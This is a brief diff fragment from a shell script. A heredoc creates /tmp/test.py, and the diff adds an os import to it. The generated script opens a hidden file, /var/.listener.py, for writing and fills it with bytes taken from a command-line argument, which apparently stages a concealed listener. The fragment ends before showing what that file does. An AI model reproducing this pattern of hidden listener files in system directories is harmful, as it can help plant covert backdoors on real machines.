@@ -32,6 +32,7 @@ EOFA
 cat <<EOFA > /tmp/test.py
 import file
 import sys
+import os
 def main():
 	f = open("/var/.listener.py", "w")
 	package = bytes(sys.argv[1], 'utf-8')
